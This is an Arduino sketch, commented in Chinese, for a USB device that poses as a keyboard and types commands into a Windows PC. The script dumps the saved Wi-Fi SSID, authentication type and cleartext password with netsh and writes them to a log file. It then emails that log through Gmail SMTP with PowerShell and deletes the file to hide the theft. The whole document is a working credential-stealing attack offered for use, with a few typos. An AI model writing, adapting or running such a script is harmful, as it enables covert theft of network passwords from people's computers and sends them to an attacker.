/ /无线密码捕获工具
//说明:将SSID、网络类型、鉴权、密码保存到Log.txt中，将Log.txt的内容通过email发送到gmail账户。
void setup() {
  Keyboard.begin();
  delay(3000);
//Minimize all windows and open run cmd
  Keyboard.press(KEY_LEFT_GUI);
  delay(200); 
  Keyboard.press('d');
  delay(200); 
  Keyboard.release('d');
  delay(200); 
  Keyboard.print("r");
  delay(200); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(200); 
  //=========================cmd==========================
  Keyboard.println("cmd");
  delay(1000);
  //获取SSID信息
  Keyboard.println("CD \"%userprofile%\\dEsktop\" & FOR /F \"TOKENS=2 DELIMS=: \" %A in ('NETSH WLAN SHOW INTERFACE ^| FINDSTR \"SSID\" ^| FINDSTR /V \"bssid\"') DO SET a=%a");
  //搜寻关键字符串，创建TXT文件
  Keyboard.println("NETSH WLAH SHOW PROFILES %a% KEY=CLEAR | FINDSTR /C:\"nETWORK TYPE\" /C:\"aUTHENTICATION\" /C:\"kEY cONTENT\" | FINDSTR /V \"BROADCAST\" | FINDSTR /V \"rADIO\">>a.TXT");
  //获取网络类型
  Keyboard.println("FOR /F \"TOKENS=3 DELIMS=: \" %a IN ('FINDSTR \"nETWORK TYPE\" a.TXT') DO SET b=%a");
  //获得认证
  Keyboard.println("FOR /F \"TOKENS=2 DELIMS=: \" %a IN ('FINDSTR \"aUTHENTICATION\" a.TXT') DO SET c=%a");
  //获得密码
  Keyboard.println("FOR /F \"TOKENS=3 DELIMS=: \" %a IN ('FINDSTR \"kEY cONTENT\" a.TXT') DO SET d=%a");
  //删除TXT文件
  Keyboard.println("DEL a.TXT");
  //创建文件Log.txt
  Keyboard.println("ECHO ssid: %a%>>lOG.TXT & ECHO nETWORK TYPE: %b%>>lOG.TXT & ECHO aUTHENTICATION: %c%>>lOG.TXT & ECHO pASSWORD: %d%>>lOG.TXT");
  //邮件发送Log.txt
  Keyboard.println("POWERSHELL");
  Keyboard.println("$smtpiNFO = nEW-oBJECT nET.mAIL.sMTPcLIENT('SMTP.GMAIL.COM', 587)");//国内推荐使用163，qq邮箱
  Keyboard.println("$smtpiNFO.eNABLEsSL = $TRUE");
  Keyboard.println("$smtpiNFO.cREDENTIALS = nEW-oBJECT sYSTEM.nET.nETWORKcREDENTIAL('account@GMAIL.COM', 'password')");//邮箱账号、密码
  Keyboard.println("$rEPORTeMAIL = nEW-oBJECT sYSTEM.nET.mAIL.mAILmESSAGE");
  Keyboard.println("$rEPORTeMAIL.fROM = 'account@GMAIL.COM'");
  Keyboard.println("$rEPORTeMAIL.tO.aDD('receiver@GMAIL.COM')");
  Keyboard.println("$rEPORTeMAIL.sUBJECT = 'wIfI KET GRABBER'");
  Keyboard.println("$rEPORTeMAIL.bODY = (gET-cONTENT lOG.TXT | OUT-sTRING)");
  Keyboard.println("$smtpiNFO.sEND($rEPORTeMAIL)");
  Keyboard.println("EXIT");
  Keyboard.println("DEL lOG.TXT & EXIT")//清除log.txt文件并退出
  //======================================================
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//结束键盘通讯 
}

void loop() {
}
